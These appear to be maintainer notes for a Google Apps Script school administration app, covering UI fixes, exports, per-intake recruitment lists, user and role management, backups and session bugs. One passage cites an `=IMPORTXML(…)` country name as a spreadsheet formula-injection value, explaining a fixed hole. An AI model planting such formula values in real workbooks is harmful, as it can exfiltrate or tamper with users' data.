  table with no scroll (460px was 15px short). A phone cannot fit 646px of them whatever the cap, so
  it scrolls — and the panel lives inside `.shinsei-tip`, so moving the pointer in to scroll does not
  dismiss it.

Every other tab is pixel-identical to HEAD. ⚠️ `account-desktop` (and occasionally `users-desktop`)
is **bistable on unchanged code** — rendering HEAD three times gives both values — so a single diff
there proves nothing. The font-load race this file already records twice.

#### 日本語・文化2年課程's 「その他」 — the "CEFR toggle is broken" report (2026-09-14)

⚠️ **The toggle was never broken.** 「判定:CEFR〇〇相当」を「その他」に含める only ever adds or removes the
last line of the **プレースメントテスト** 「その他」 box (`placementText`); the 面接 box keeps its CEFR line
either way. `_shinseiBuildDocHtml_` wrote `placementText = ""` for 日本語・文化2年課程 because that course
had no placement test, so the box was empty and there was nothing for the toggle to include.
- It has a placement test now. The paragraph is 進学1年6か月's **without** 「60点以上をA2相当」: A1 is this
  course's required level (decided by the school).
- ⚠️ A record with **no** placement score keeps the empty box. A paragraph saying 「 点を取得している」
  with no number would be false on an official form; the ■/□ already follows `placementScore`.
- Found by running the real builder in a `vm` per course × toggle, after a live probe, the `apiRun`
  path, the pre-merge diff and a shadowing check all came back clean. When a toggle "does nothing",
  check whether its **input** is empty before debugging the toggle. `tests/shinseicols.test.js` §11.

#### 申請関連 is NOT a separate HTML file

⚠️ `Shinsei_Template.html` is the **A4 PDF template** (`@page { size: A4 }`, black-bordered
tables, page breaks). The tab is `#view-shinsei` in `Index.html`, gated on `view_shinsei`,
so the finish tokens already reached its `.shinsei-*` rules.

⚠️ **What they could not reach was INLINE styling**, and that is exactly where the
leftovers were: `.edit-selector` carried a raw `border-radius: 8px` and a hardcoded
`rgba(15,157,88,0.03)` green belonging to no palette. Inline beats the stylesheet — the
same wall the button sizes hit. When a refresh "already covers" a screen, grep it for
inline `style=` before believing that.

- The 新規作成 / 既存編集 pair is a **segmented control** (`.seg-track`) rather than two
  full-width slabs. ⚠️ `flex: 1` on `.mode-btn` is what made them span the width.
- ⚠️ **No media rule covers `.shinsei-*` or `.mode-btn`**, so density changes there land on
  phones too. Measured at both widths: 194px track, 40px touch target on a phone.

#### The button size scale

⚠️ **The button classes carried NO size**, so 42 call sites each invented one inline —
21 distinct paddings and 8 font-sizes, and five different heights inside 学生一覧 alone
(h20 ＋行を追加, h27 性別集計, h29 フィルタ解除, h35 国名設定, h39 保存). Reported as
"inconsistent button sizes, especially on 学生数".

⚠️ **It could not be fixed from CSS.** An inline style beats any rule here and
`!important` is confined to the media block, so the declarations had to come out of the
markup. Three sizes now: default `8px 15px`/13px, `.btn-sm` `5px 12px`/12px,
`.btn-xs` `2px 9px`/11px.
- ⚠️ **Sizing lives ONLY in the scale block.** `.schedule-btn` / `.export-btn` /
  `.btn-save` / `.btn-cancel` are declared *earlier* in the file, so a padding restored
  to one of them beats `.btn-sm` on source order and silently reopens the drift.
- ⚠️ **Tier by ROLE, not by the value that was already there.** The first pass assigned
  tiers mechanically from each button's old inline padding: 出力 carried `5px 12px` so it
  became `.btn-sm`; 閉じる carried nothing so it kept the default — and the two sit in
  **one action row**, 27px against 35px. Reported as "出力 is significantly smaller than
  the other buttons". A toolbar button and a modal action button are the same thing
  whatever somebody typed inline years ago. **`.btn-sm` is for buttons inside a table
  row**, nothing else.
  - ⚠️ `.clear-filters` must be in the DEFAULT group, not `.btn-sm` — フィルタ解除 sits
    directly beside 出力. It was briefly in neither, which sized it at 21px.
  - `tests/designtokens.test.js` §8 asserts every `expToggle` button is full size and
    that `#stuTrendActions` is one tier throughout.
- ⚠️ **No `line-height` in the scale, deliberately.** Adding `line-height: 1.35` looked
  harmless and split the toolbars 28px/26px: those rows are `display: flex` with default
  stretch, so direct-child buttons stretched to the row while 出力 — which sits inside
  `.exp-wrap`, not directly in the row — kept its natural height. Measured both ways.
- ⚠️ **The 33 class-less inline-styled buttons are OUT of scope** — `background: none;
  border: none` icon controls (photo-slot ✕, accordion toggles). Their size is intrinsic,
  not drift. `tests/designtokens.test.js` §7 asserts they keep their inline styles so a
  later sweep cannot tidy them away.
- ⚠️ `tests/mobile.test.js`'s 増減推移 check used to find the 出力 button by its literal
  inline style and broke when the scale removed it. It now finds it by **scope**
  (`#stuTrendModal`'s markup) — anchor on structure, not on paint.

#### 出力 is one control with one pipeline — including シミュレーション

Five tabs, one `.exp-wrap` + `.exp-menu`, one `expRun` → `_expCsv` / `_expXlsx` /
`_expPdf`. 募集シミュレーション used to have its own single-format `Excel出力` button.

⚠️ **Wiring it in looks like one registry line in `_expActive`, and that line is WRONG in
a way nothing reports.** `_expReadTable` reads `td.innerText`, and the simulation's
projection cells are `<input type="number" value="…">` — **an input's value is not in
`innerText`**. Measured on the same row, both paths:

```
simExportRows()           ["ネパール", 18, 9, 2, 1,  4,  2, 6, …]
_expReadTable(simTable)   ["ネパール","18","9","2","1", "", "", "6", …]
```

Four blank cells, exactly where the projected figures belong. A `table:` entry would have
exported the simulation without its projections and looked entirely healthy.
- ✅ So the entry carries a **`rows` provider** reading `simState`, not the DOM — which is
  also why it still works when `simCanEdit()` is false and the inputs are `disabled`.
  ⚠️ `_expRows` must test `a.rows` **before** its DOM branch: the entry keeps a table id
  for `_expActive`'s shape, so the DOM branch would otherwise win.
- ⚠️ **`_expXlsx` gained an optional `merges` argument** for this. The bespoke exporter
  merged 国名/総数 down two rows and each intake across its courses; routing through the
  shared writer would have silently flattened a layout that had always been there. The
  argument must survive the `_withXlsx` late-load retry too, or the merges vanish only
  when the library loads slowly.
- ⚠️ **`expRun` carries ONE deliberate permission exemption**, for `simulation` alone.
  The old button had no `permission-req`, so gating it would remove an export people have
  today; it is an egress gate on figures already on the caller's screen. `tests/exportmenu.test.js`
  §3 asserts exactly one `? null` exists, because a second is how a gate becomes optional.
- ⚠️ The driver needs its `getSimulationData` fixture: without it the grid is empty,
  `simExportRows()` returns a lone 合計 row, and an export check passes while proving
  nothing.

### 募集状況's country list is per-入学期

`Recruitment_Meta` stored countries as `種別 | 値 | 地域 | 並び順` with **no intake column**, so
`_recruitMetaLists_` collected them into one list and every intake got the same one. Pruning one
intake's grid pruned every other intake's. Reported as 「the countries shouldn't share across the
intakes … users need to delete some countries for some intakes to make space for other
countries」. ⚠️ `recDeleteCountry`'s own comment described the behaviour — *"would remove it from
every intake's grid"* — as a caution about stray clicks. It was the bug, written down as a
feature.

⚠️ **Column E 入学期, and a BLANK one means "every intake".** That is what every row written
before the column existed is, so the change needed **no migration**: on day one each intake still
saw exactly the list it saw before, and nothing could half-land on a live sheet. `_recCountriesFor_`
is the only place that rule lives.
- ⚠️ **Countries are no longer deduped by NAME on read** — by `(name, intake)`. The name-only
  dedupe is precisely what made one list serve everything.
- ⚠️ **地域 resolves per NAME across all rows, never off the matched row.** Per-intake rows each
  carry a 地域 cell, so reading it locally would let one country sit in 南アジア for one intake and
  欧米・その他 for another — and the grid groups by it, so the row would move when you switch.

⚠️ **`_recMaterialiseLegacyCountries_` expands the blank rows, and it is a WRITE path only.**
A per-intake delete cannot be expressed while a row is shared, so the first country-list mutation
(add country / delete country / add intake) expands every blank row into one row per intake and
drops the blanks. Idempotent.
- ⚠️ **Never call it from a read.** `getRecruitmentData` / `getRecruitmentBundle` run for anyone
  holding `view_recruitment`; a silent write from there is refused or lands under the wrong
  caller. The read only ever *interprets* a blank row. `tests/recmeta.test.js` §6 asserts it
  appears in neither.
- ⚠️ **It enumerates `_recAllIntakes_()`** — `Recruitment_DB` ∪ `Recruitment_Capacity` ∪ meta.
  An intake can exist purely because numbers were entered against it; enumerating meta's own
  `intake` rows would strip every country from those.
- ⚠️ Legacy rows are deleted **bottom-up** (`deleteRow` shifts everything below), after a
  `_snapshotSheet_`, and the append happens first because appending does not shift the rows above.

⚠️ **A country with no intake selected is REFUSED, on both sides.** A blank row belongs to every
intake and cannot be removed from any single one — writing one would quietly recreate the bug.

⚠️ **A new 入学期 seeds from the newest EXISTING one** (`_recSeedIntakeCountries_`), so nobody
re-enters twenty countries per intake. Newest by **`_recIntakeSortKey_`**, never lexicographic:
「2026年10月生」 sorts *before* 「2026年4月生」 as text, so a plain compare seeds from the wrong
intake about half the time. ⚠️ That key had already been written out **twice**
(`_recruitIntakeList_` and `getRecruitmentData`); it is now one function and both call it.

- ⚠️ **`_RECRUIT_RANGES`' meta entry is `A:E` / 5.** `batchGet` truncates to the range, so a short
  one hands back `undefined` for every 入学期 — every row then looks legacy and the whole feature
  silently does nothing.
- ⚠️ **`addRecruitmentMeta` wrote 国名 unwrapped.** User-typed free text straight to the sheet, so
  a country named `=IMPORTXML(…)` ran as a formula next time anyone opened the workbook —
  pre-existing, and fixed at that write site rather than left because it is the line being changed.
- **A country holding numbers still shows regardless.** `_recNationalityRows` unions the list with
  every country present in `counts`, so deleting one cannot hide entered figures. Unchanged.
- The delete confirm now names the one intake and says 「他の入学期には影響しません」; the 国名設定
  modal heading carries the intake too. ⚠️ A warning that overstates the damage is how people stop
  reading warnings.
⚠️ **A 国名 delete was 5–10 seconds, and the cost was not where the feature is.** Reported
right after the per-intake change shipped. Four things, all of them work the call was doing
twice or needlessly:
- **THREE full reads of the same small sheet** per delete — the materialiser's own, its header
  probe, and the caller's. `_recMaterialiseLegacyCountries_(sh, rows)` now takes the caller's
  rows and **returns the rows to carry on with**, re-reading only when it actually changed the
  sheet. One read per mutation, asserted.
- ~~`_snapshotSheetThrottled` for 国名~~ — **superseded 2026-09-11 by the measurement below**:
  a 国名 delete now takes no sheet copy at all. 入学期 / 担当者 / 地域 deletes still take the full
  un-throttled copy: they are rare, and they orphan grid data keyed by the removed name.
- ⚠️ **`setTimeout(recRender…, 400|500)` after `recLoad()` was a guess fired when the reload
  STARTED.** Longer round trip and the modal painted pre-delete data; shorter and it was dead
  time. `recLoad(forceIntake, after)` now calls back on completion, and **`after` must travel
  through recLoad's own blank-intake re-entry** or the caller is stranded on exactly the path
  that takes longest. All five call sites converted; no `setTimeout(recRender` remains.
- ✅ **SOLVED BY MEASURING, 2026-09-11. It was ~5s after all four fixes above, and those were
  chosen by reasoning alone.** `profileRecruitMeta()` (editor-run) timed each server leg three
  times on staging. Medians across the three runs:

  ```
  full sheet copy (snapshot)   ~1540 ms   ← one row of settings was all it protected
  bundle reload                ~ 770 ms   ┐ round trip 2: re-fetching all of 募集状況
  session resume (2nd call)    ~ 420 ms   ┘ to learn that one name left one list
  deleteRow                    ~ 555 ms   (noisy: 488–1083)
  session resume               ~ 420 ms   (every call pays it)
  _logActivity_                 ~ 325 ms
  Recruitment_Meta read        ~ 220 ms
  ```

  About 4.25s of server work across two round trips, plus Apps Script's per-call overhead on
  each. The two avoidable legs were exactly the two largest:
  - **No sheet copy for 国名.** The deleted ROW (地域 / 並び順 / 入学期) goes into the 操作履歴
    entry instead, captured before `deleteRow`. A 国名 delete never removes entered numbers,
    so that row is everything a mistake loses.
  - **In place, not a reload.** `recDeleteCountry` drops the name from `recData.addedCountries`
    and redraws. That is identical to the reload's result, because `_recNationalityRows` unions
    the counts, so a country with numbers stays on the grid either way. Anything unexpected
    (nothing removed, the intake switched mid-call) still takes the old reload.
  - Expected ~1.5s of server work in one round trip. The remaining legs (session resume,
    deleteRow, the audit append) are paid by every write in this app.
  - ⚠️ **The lesson is the order, not the fixes.** Two rounds of reasoning found real waste,
    such as three reads of one sheet and a guessed 500ms timer, and missed both of the actual
    big costs. One run of the profiler named them. Both instruments stay: the profiler, and the
    `[募集状況] 国名削除` console line.
- ⚠️ `tests/recmeta.test.js` §7 pins the read count, the throttle split and the callback. Its
  §6 check was first written against the literal call text and broke on this refactor — it is
  now pinned on the property (three mentions, none inside a reader), because a test that fails
  on a refactor it does not care about is a test that gets loosened.

- The driver's `getRecruitmentBundle` fixture answers **per intake** (`__recCountriesByIntake`).
  With one static `addedCountries`, switching intake renders an identical grid and the whole change
  looks like a no-op locally.

#### 募集状況 clean-up (2026-09-11) — same layout, measured fixes only

Asked to "clean up 募集状況 without changing it too much". Every section stays where it was,
and so do the grid, its dividers, the amber 未保存 outline (`outline`, so no border change
touches it) and the `-30px` 日程 alignment. `tests/recruitui.test.js` runs each check against
the old markup too, and it must fail there.
- **保存 is the one solid button.** `#sub-view-recruit .schedule-btn` is tonal on desktop, which
  is what the mobile block already did. ⚠️ **No border** in the desktop rule: it added 2px to
  every button. Phones keep their bordered version from the media block (same specificity,
  later in the file).
- **定員 inputs had no class**, so they rendered with the browser's 2px inset border. They are
  `.rec-num` now.
- **The 日程 row fits.** `repeat(4, 160px)` was 670px in a ~647px column, and 担当 stuck out
  17px. It is `auto-fill, minmax(140px, 1fr)` now, which wraps on a narrow window. The four
  fields are named by id, because `#recDateGrid` is reserved to the media block by
  `mobile.test.js`.
- **連絡事項 fills down to the 定員 table.** ⚠️ It needed the inline `max-height:220px` removed:
  an inline style beats any stylesheet rule, and it stopped the fill 21px short. Phones get the
  old box back through the media block, because stacked there is nothing to fill to.
- **Rosters: 22px controls, and box-sizing is NOT changed.** `border-box` shrank every text
  area by about 8px, measured, and made truncation worse. The text stays 11px because the three
  キャンセル tables share one row: 1262 of 1290px at 1440 after 担当 went 72 → 84. That is why
  it is +12 and not more; a classic 15px scrollbar eats the rest. Six-character 担当 names
  still clip by a few px.
- ⚠️ **The キャンセル column is `flex:0 1 auto; min-width:0` now.** `flex:0 0 auto` never let
  the three tables wrap, so any window narrower than ~1260px of content ran them past the edge.
  That was pre-existing: 1334px against a 1108px edge at 1000px wide, measured on HEAD.
- **Add and delete are `<button>`s** (`.rec-x`, `.rec-plus`, `.rec-x-hdr`), because a span has no
  keyboard path. There is one glyph, ✕; 不交付 used ×.
- ⚠️ **Driver trap: in zsh, `${2:+--sub $2}` expands to ONE argument.** The driver then silently
  shows the default sub-view. A pixel diff of "every 学生一覧 sub-tab" came back identical
  because every shot was 在籍学生. Pass `--sub` literally, or run the loop under `bash`, and
  check that the shots differ from each other before trusting an "identical".

### ユーザー管理 — four sub-tabs, and the editor in the order decisions are made

Reported as "very unintuitive". Measured before: five unrelated tools on one **1423px** page with
an **empty** `#sb-sub-users`; "who is signed in" in a second table whose help text pointed back at
the first; a **red** PWリセット on every row; the editor **980px** in a 900px window, 保存 below the
fold; 25 permission boxes in one flat grid; and the 管理者権限 switch — which overrides all 25 —
placed **after** them. Rebuilt 2026-09-11; `tests/usersadmin.test.js` pins it, all 20 mutations
checked to fail.

⚠️ **The sub-tabs are ユーザー / 役割 / お知らせ / 操作履歴・バックアップ, and ONE function gates
them.** `_usersSubAllowed(key)` is read by the buttons **and** by `switchUsersSubTab`, which
refuses a disallowed key — so hiding a button is not the whole gate. 役割 and お知らせ stay
`isMasterRole()`, exactly as the panels were (an admin manages users; the master defines roles, or
an admin mints a role carrying `manage_users` and promotes itself).
- ⚠️ **操作履歴・バックアップ follows its endpoints to `isAdminRole()`. It was a real defect:** the
  panel showed to anyone with `manage_users`, while `getActivityLog`, `getSnapshotList` and
  `diagnoseInChargeMatching` all require `_isAdminLevel_` — some admins saw three buttons that each
  answered 権限がありません. Aligning the client with the server; no guard moved.
- ⚠️ Ids are `btn-users-*` / `users-view-*`, and the class is `.users-sub`. `btn-sub-*` /
  `sub-view-*` is shared by 学生一覧 and 入試関連, and `.sub-view-section.active` is queried
  **document-wide** elsewhere — reusing either would make these sub-views answer another tab's code.
- ⚠️ **`USERS_SUBS` / `_usersSubNow` are declared beside `rolesData`, far above where they are
  used.** `setupInterfaceBasedOnRole` reads them, and it can run **synchronously during script
  execution**: `tryResumeSession()` is called at top level and runs `settled(window._boot)` on the
  spot when the first block's boot prefetch has already landed. Declared lower down they are in
  the temporal dead zone, the setup throws, and the app is blank (rule 3). §2 asserts the order.

⚠️ **The list shows each STORED fact where it lives, and never combines them.** `getSystemUsers`
returns only the **person's** 管理者権限 (`adminUser`); the server's `_isAdminLevel_` reads the
person flag from the *session*, so it answers "is the caller admin" and cannot judge anyone else.
OR-ing person + role flags in the browser would re-derive that decision — the drift the Roles
section warns about. So the person flag is a badge on 状態 and the role's flag is a line on 役割.
- ⚠️ **Sessions join on the ACCOUNT, never `id` alone and never the literal role** — see
  "Sessions" below. 「ログアウトさせる」 appears only on a signed-in row.
- 設定済み carries no badge; only states that need action do. A badge on every row is on no row.

⚠️ **The editor: 基本情報 → 管理者権限 → 機能権限 (grouped) → アカウント操作.** 管理者権限 moved above
the permissions because it overrides them. While it is on the groups **collapse** — ⚠️ a class,
never `disabled`, never cleared: overriding is not erasing, and the ticks apply again when the flag
comes off. The note stays keyed on the **checkbox**, not on master, so a non-master opening a
flagged colleague still learns why the ticks don't describe their access.
- ⚠️ **Scoped `#userModal .um-box`**, body scrolling and heading/保存 fixed. Never the global
  `.modal-box` rule (the `#stuTrendModal` `.exp-menu` anchor). ⚠️ The name/ID rows are **nested**
  now, so the phone stacker (`.modal-box > div[style*="display:flex"]`, direct children only)
  cannot see them — `#userModal .um-row` restates the column layout in the media block.
- The 25 boxes are five `<fieldset class="perm-group">` blocks following the real tab gates
  (`view_students` / `view_dorms` / `view_admissions` / `view_shinsei` / `manage_users`), each
  led by its `data-gate` box. ⚠️ **They stay static markup** — `buildRolePermList` clones them into
  the role modal (one source of truth) and now inserts a heading whenever the group changes; clones
  keep `role-perm-cb` so `saveUser()` cannot collect them.
- ⚠️ **A permission ticked without its screen's 表示 is FLAGGED, never auto-fixed.** It is saved
  and unreachable, because the tab holding it stays hidden. Auto-ticking the parent looks kinder and
  is a silent grant: ticking 学生一覧 表示 so 募集状況 opens **also hands over the student list**.
- ⚠️ The password is a `<code>` element — its default face is monospace — because `font-family`
  appears exactly **once** in the stylesheet.

⚠️ **A new user gets their temporary password on save, and that exposed an overwrite.**
`saveUser` chains `adminResetPassword` **inside** the save's success handler (the reset looks the
row up, so it must run after the write), keeps the editor open, and shows the password with a
コピー button in place of the old `window.prompt`.
- ⚠️ **`saveSystemUser` had no duplicate-ID check for new users.** With `oldId` blank it searched
  for `u.id` and took the UPDATE branch — silently overwriting a colleague's name, email and
  permissions. The chain would have escalated that into **resetting the colleague's password**. Now
  refused on both sides, compared **trimmed** so 「S01 」 cannot slip past. Editing sends `oldId`
  and never reaches the guard. ⚠️ The id is trimmed for **new** users only — on an edit it must
  stay byte-exact or the server's row search misses the record.
- ⚠️ **Save-ok / reset-failed says exactly that** — 「…は登録されましたが、一時パスワードを発行
  できませんでした」 — and turns the editor into that user's editor (`modalUserOldId`), so the retry
  is one click and a second 保存 cannot create them twice.
- ⚠️ `adminResetPassword` stays a **direct** `google.script.run` call. It is off the `apiCall`
  registry and resolves the caller from the token; `apiRun()` is what broke `loginUser`.
- ✅ `saveSystemUser` writes through `_cellSafeRow_` since 2026-09-11. Name, email and permissions
  had gone to Staff_Master / Teacher_Master unwrapped, which is the formula hole in "The recurring
  bug class". ID and name are now one `setValues`: the columns are adjacent, and column 3 (the old
  PIN) stays untouched. The role cell and the `"Y"` flag are not wrapped, deliberately: the role
  must pass `_roleByKey_`, and the flag is a literal. `tests/cellsafe.test.js` §5 pins all three
  sites.

- The driver has a `getActiveSessions` fixture (**one** user signed in — all or none cannot show
  the contextual button), an `adminResetPassword` fixture that fails on `window.__pwResetFail`, and
  a **`users-only`** persona holding `manage_users` without admin level — the caller defect 10 hit.
- Desktop pixel-identical on every other tab, proved by diffing `driver.mjs shot` before and after.

#### 役割 / お知らせ / 操作履歴・バックアップ — the same theme, and three お知らせ defects

Rebuilt 2026-09-11 in the ユーザー sub-tab's theme: `.users-table`, name-first rows with a `.u-sub`
line, `.u-badge` state, `.btn-sm` row buttons. The role editor is the user editor's shape, and
**every `#userModal` rule has a `#roleModal` twin** as a plain comma list. ⚠️ Not `:is()`: an older
browser drops the whole rule. `tests/usersadmin.test.js` §10–§12, with all 20 mutations checked.

⚠️ **お知らせ had three real defects, all server-side:**
1. **「管理者のみ」 reached almost nobody.** `getAnnouncements` matched the target as a **literal
   role string**, so it reached only accounts whose role is literally `admin`, a role nobody can
   be assigned now. Custom roles could only receive 「全員」.
2. **`postAnnouncement` silently widened an unknown target to `all`.** Role options added on the
   client alone would have sent a notice meant for 事務 to **everyone**. An unknown target now
   **throws**; valid targets are `all`, `adminlevel`, and anything `_roleByKey_` knows.
3. **Delete trusted a row number.** `deleteAnnouncement` now requires the id and refuses unless that
   row still holds it (§8.3). A stale list used to delete the next announcement.
- ⚠️ **`adminlevel` is a NEW key, not a new meaning for `admin`.** Reinterpreting `admin` would
  silently widen the audience of announcements already sent. `adminlevel` asks `_isAdminLevel_`, which
  reads the session, so it asks about the **reader**. Every other target now compares against
  `_effectiveRole_(role)`, the session's role, not the string the browser sent.
- ⚠️ 既読 shows `N / M` only where M is countable without re-deriving anything (全員, each role, by
  the same literal match). For `adminlevel` it shows `N人`, because counting admin-level users in the
  browser is the `_isAdminLevel_` copy the Roles section warns drifts.

**役割** shows which screens a role opens (read from the user editor's `.perm-group` / `data-gate`
markup, the one permission list) and how many hold it (the same literal match `deleteRole`'s
`_usersWithRole_` makes). 削除 is disabled with the reason before you try, which is exactly as strict
as the server. `_umCheckPermGates(container)` serves **both** editors and selects by `data-gate`,
not by class, because the role editor's clones are `role-perm-cb`.

**操作履歴・バックアップ** is a `.seg-track` of three chips, **one panel per tool**. The three used to
write into one shared `#dataSafetyContent`. Each loads the first time it is shown and keeps its
content. Log headers are mapped **by name** (`DS_LOG_HEADERS`), never by index. Backups are grouped
by sheet, ⚠️ with the **groups ordered by their newest backup**, not by name, and the fixture is
built so alphabetical order would render wrong. The restore `onclick` uses `escAttrJsStr`, and
`restoreSnapshotConfirm`'s type-the-sheet-name gate is untouched. The 担当 check says ユーザー管理,
never `Staff_Master`.

⚠️ **Two implementation lessons, both about replacing functions in this file:**
- **Insert-then-delete finds the NEW copy.** Dropping a block that re-defines `annLoadList` above
  the old one, then removing "the" `annLoadList`, removes the new one: `extract()` takes the first
  match. A count assertion ("exactly one remains") passed while the **old** version survived, and
  only rendering it showed that. Remove the old copies **first**, and assert **which** version
  survived by a marker, not how many.
- **A brace-matcher must skip comments.** An apostrophe in a comment ("the editor's markup") was
  read as a string opener, and the slice ran into the next function. The single-function assertion
  caught it.

⚠️ **A pixel baseline can go stale without the code changing.** The ユーザー list baseline stopped
matching mid-session. Rendering the **last commit** under the same conditions also differed, and
was pixel-identical to the new code, which proves the list itself did not move. When a diff flags
something you did not touch, render the old code before believing it.

### Data safety — when a sheet copy is taken (3×/day, not on every save)

**Changed 2026-09-11, on measurement.** `profileRecruitMeta` timed one `_snapshotSheet_` at ~1.5s
(1.25–4.0s) on a 116-row sheet, and ~40 save and delete paths took one while the person pressing
保存 waited. Asked "if we reduce the backups, the whole app runs faster?": **saves** get faster,
by that ~1.5s. Loading does not change, because reads never took a copy. And the cost is the
number of copies **made**, not the number kept.

- **`triggerScheduledBackup()`** copies every sheet that **changed** since its last run. It
  keeps an MD5 fingerprint per sheet in script properties, so unchanged sheets are skipped and
  retention holds distinct versions.
  - ⚠️ **It never copies `Sessions`** (live bearer tokens) or `Activity_Log` (its own history, and
    the largest sheet).
  - It follows the `triggerAutoSyncStudents` pattern: gated by `_requireTriggerOrUnlock_` (since
    2026-10-26: a real trigger's `triggerUid`, or an unlocked editor Run), then throttled; it parks
    a system session, restored in a `finally`. Before the gate, the throttle was the only guard,
    and being set before anything else it let an anonymous call make the real run skip.
  - ⚠️ **Setup is by hand, per project, exactly like the sync.** Create three time-driven Day
    timers (e.g. 7–8時 / 12–13時 / 17–18時) in each of staging and production, then run it once.
    There is no `ScriptApp` code, so no new OAuth scope. **Until the triggers exist there are no
    routine backups**, and the バックアップ pane says so.
- **Kept, immediate copies** (the allowlist in `tests/backup.test.js` §3, derived from the source
  both ways):
  - `restoreSnapshot`, so a restore can itself be undone;
  - the `migrate…` one-offs;
  - `syncDormsFromCentralDB`, the unattended data-loss path;
  - `importResultsFromBookings` and `saveSimulationData`;
  - `saveEnrollmentMonths` and `reorderPlacementConfig` (both rewrite many rows);
  - `deleteBuilding`, which removes its rooms too;
  - `_recMaterialiseLegacyCountries_`;
  - the 入学期 / 担当者 / 地域 deletes;
  - `profileApp`.

  ⚠️ A routine save that starts copying again fails that suite; it would be paying ~1.5s again.
- **Single deletes put their whole row in 操作履歴** via `_rowForLog_`, so a mistake is fixed **by
  hand**. Before, their details column was empty: it recorded who, when and which record, not
  what the record held. A whole-sheet restore from a scheduled copy would also roll back every
  other edit made since that run.
  - ⚠️ **Credentials never reach it.** `PIN` and every `ACCOUNT_HEADERS` column are dropped by
    header name, **and** `deleteSystemUser` omits columns 3 and 7–11 by position. An older sheet
    with a blank header over the hash would otherwise log it as 「列7=…」. §2 proves the leak
    exists without `omit`.
  - The row is captured **before** `deleteRow`, and the suite asserts the order.
    `cancelBookingFromDateChange` counts as a delete: the student, course and 担当 go the moment
    it writes. `removeBuildingDoc` logs the file id instead, because the file goes to Drive's
    trash for 30 days.
  - **Edits log no old values**, deliberately. An edit's previous value comes from the last
    scheduled copy.
- ⚠️ **`_snapshotSheet_` now returns whether it copied.** It swallows its own errors (a backup
  must never block a save), and the job would otherwise record a failed copy's fingerprint and
  skip that version for good.
- `SNAPSHOT_KEEP` is **21**, a week of 3×/day. ⚠️ Sheets caps a spreadsheet at 10M cells; the run
  reports the backup file's total, and the pane warns past 8M.
- **A stopped trigger is visible.** Each run stores a report in a script property and writes one
  「自動バックアップ」 audit line. The バックアップ pane shows it, and warns when the report is
  missing, older than 12 hours, errored, or has failed copies (`_dsAutoLine`). This is the
  dorm-sync lesson: nobody reads an unattended job's log.
- ⚠️ **Staging v190 did not LOAD.** `const BACKUP_EXCLUDE = [SESSION_SHEET, …]` sat ~800 lines
  above `const SESSION_SHEET`, and Apps Script runs every top-level line of the project on every
  execution, in file order. That is a TDZ `ReferenceError` while the script loads, so every
  endpoint and the page failed, not just the backup. `node --check` and all 48 suites passed,
  because each sandbox defined what it needed first. It is `_backupExclude_()` now, read at call
  time. **`tests/loadorder.test.js` executes both server files' top level in both orders**, with
  every Apps Script service stubbed, and fails on the v190 line (mutation-checked). This is rule 3
  on the server side: **a top-level `const` may only read constants declared above it.**
- `_snapshotSheetThrottled` and `SNAPSHOT_THROTTLE_SEC` are **deleted**. They were the pre-measurement
  attempt at this cost.

### Sessions — 最終操作, ログアウトさせる, and what a dead session does

Three defects, found together on 2026-09-11, and `tests/session.test.js` covers them. It runs
the **real** functions, extracted into a `vm` sandbox with the sheet stubbed, and it runs every
guard against its old shape, which must fail.

⚠️ **最終操作 showed the OLDEST session.** Someone active on Sept 10 showed a date in May. Two bugs
stacked:
- `getActiveSessions` sorts newest-first, and the client did `m[key] = r`, so the **last** row won,
  which is the oldest. It now keeps the largest `seenAt` and does not depend on server order.
- The server listed **expired** sessions as live. An expired session is refused on resume, but it
  stays in the sheet until that token comes back or somebody logs in fresh, which is rare because
  sessions persist. It is now filtered with `_sessionExpired_`, the same decision resume makes.
  ⚠️ **Filtered, never deleted**: this is a read path.
- The driver fixture had one session per user, which is the only shape where `m[key] = r` looks
  right. It now has two for S01, **older last**.
- The date can still trail by up to 6 hours (`SESSION_TOUCH_WINDOW`). That is by design and is not
  this bug.
- ⚠️ **THAT FIX WAS NOT ENOUGH, and the reason is the lesson.** It shipped in V1.37.0 and production
  still showed the oldest date, because **production displays dates MONTH-first**
  (`9/11/2026 10:42:07`, the default for an English-language Google account). `_sessionAgeMs_`
  reads only year-first, so every row was "unreadable". That meant every `seenAt` was 0, so
  newest-wins compared zeros and kept the first (oldest) row. It also meant **no session had
  expired since the 30-day rule shipped (2026-08-19)**: "unreadable" counts as current, and one
  account had 11 live, working logins. The repro and the driver fixture used year-first dates,
  which is the only shape where it looked fixed. Confirmed with the user from the sheet itself.
  - **Never parse a Date's DISPLAY.** Session times are now written as TEXT in one fixed format:
    `_sessionStamp_` produces `'2026-09-11 10:42:07`, where the apostrophe is Sheets' text marker
    and the locale cannot reformat it. Existing Date cells are rewritten from their real
    `getValues()` Dates by `_compactSessions_`.
  - The check uses `Object.prototype.toString`, not `instanceof Date`, which is false for a Date
    from another realm.
  - **A blank LastSeen ages by Created** (`_sessionSeenOf_`). Pre-LastSeen sessions never expired
    either.
- **At most 3 live sessions per account** (`SESSION_MAX_PER_ACCOUNT`, keyed by `_sessionAccountKey_`,
  the same key as revoke and ×N). A new login retires the account's oldest; the retired device is
  signed out by the dead-session path.
- **`_compactSessions_` is ONE pass that REWRITES the sheet.** It normalises dates, drops expired
  rows and applies the cap, with one read and at most two writes, and it writes nothing when
  nothing changed.
  - ⚠️ It never uses a `deleteRow` per row. The first run after the date fix meets months of
    backlog, and a deleteRow loop on the login path is a hung login (the old `SESSION_PRUNE_MAX`
    existed to bound exactly that).
  - It runs at login and in `triggerScheduledBackup`, so every account is tidied within hours of
    a deploy.
  - It clears the tail rather than deleting rows: a sheet cannot lose all its non-frozen rows.
- ⚠️ **Every Sessions-sheet mutation runs under `_withSessionLock_`** (the script lock) with a fresh
  read. Before this, the LastSeen touch wrote to a row NUMBER from an earlier read, and any delete
  in between (login clean-up, logout, revoke, expiry) shifted rows. So 最終操作 moved between
  people, and a revoke could remove the wrong row and leave the revoked person signed in.
  - Touch and single deletes now find the token's **current** row with a text finder
    (`_sessionRowOf_`).
  - The touch uses `tryLock` and is skipped when the lock is busy (it is advisory), so requests
    never queue behind it.
  - `tests/session.test.js` §8–9 run all of this on a fake sheet that displays month-first, with
    mutations.

**Each session records the device it logged in from (2026-09-15).** Column G `Device` holds a label
such as 「Windows · Edge」, and H `DeviceId` a random id the browser keeps in `sms_deviceId`.
ログイン中の端末 shows the label and the id's first 8 characters. A browser cannot read a computer's
name or a hardware id, so this is the most that exists.
- ⚠️ **Display only.** Both come from the browser (`loginUser`'s third argument) and are cleaned by
  `_sessionDevice_`. Nothing may authorise, match or sign out by them.
